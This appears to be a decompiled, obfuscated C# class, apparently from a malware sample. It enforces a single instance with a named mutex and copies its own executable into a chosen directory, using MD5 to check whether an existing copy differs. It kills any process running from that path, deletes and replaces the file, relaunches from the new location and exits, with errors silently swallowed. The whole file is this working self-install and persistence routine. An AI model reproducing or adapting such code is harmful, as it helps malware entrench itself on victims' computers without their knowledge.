using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Threading;

internal class Class2
{
	private string string_0;

	private string string_1;

	public Class2(string string_2, string string_3)
	{
		string_0 = string_3;
		string_1 = string_2;
	}

	public bool method_0(string string_2)
	{
		try
		{
			Mutex.OpenExisting(string_2);
			return false;
		}
		catch
		{
			new Mutex(initiallyOwned: true, string_2);
			return true;
		}
	}

	public void method_1()
	{
		if (!(Environment.CurrentDirectory != string_1))
		{
			return;
		}
		string text = method_2(Process.GetCurrentProcess().MainModule!.FileName);
		if (File.Exists(string_1 + GClass0.smethod_0("]") + string_0))
		{
			ProcessStartInfo processStartInfo;
			if (method_2(string_1 + GClass0.smethod_0("]") + string_0) != text)
			{
				try
				{
					Process[] processes = Process.GetProcesses();
					try
					{
						Process[] array = processes;
						foreach (Process process in array)
						{
							if (process.MainModule!.FileName == string_1 + GClass0.smethod_0("]") + string_0)
							{
								process.Kill();
							}
						}
					}
					catch
					{
					}
					File.SetAttributes(string_1 + GClass0.smethod_0("]") + string_0, FileAttributes.Normal);
					File.Delete(string_1 + GClass0.smethod_0("]") + string_0);
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, string_1 + GClass0.smethod_0("]") + string_0);
					processStartInfo = new ProcessStartInfo(string_1 + GClass0.smethod_0("]") + string_0);
					processStartInfo.WorkingDirectory = string_1;
					Process.Start(processStartInfo);
					Environment.Exit(0);
					return;
				}
				catch
				{
					return;
				}
			}
			processStartInfo = new ProcessStartInfo(string_1 + GClass0.smethod_0("]") + string_0);
			processStartInfo.WorkingDirectory = string_1;
			Process.Start(processStartInfo);
			Environment.Exit(0);
			return;
		}
		try
		{
			if (!Directory.Exists(string_1))
			{
				Directory.CreateDirectory(string_1);
			}
			File.Copy(Process.GetCurrentProcess().MainModule!.FileName, string_1 + GClass0.smethod_0("]") + string_0);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_1 + GClass0.smethod_0("]") + string_0);
			processStartInfo.WorkingDirectory = string_1;
			Process.Start(processStartInfo);
			Environment.Exit(0);
		}
		catch
		{
		}
	}

	private string method_2(string string_2)
	{
		try
		{
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			FileStream fileStream = new FileStream(string_2, FileMode.Open, FileAccess.Read);
			byte[] array = mD5CryptoServiceProvider.ComputeHash(fileStream);
			fileStream.Close();
			return BitConverter.ToString(array);
		}
		catch (Exception ex)
		{
			throw ex;
		}
	}
}
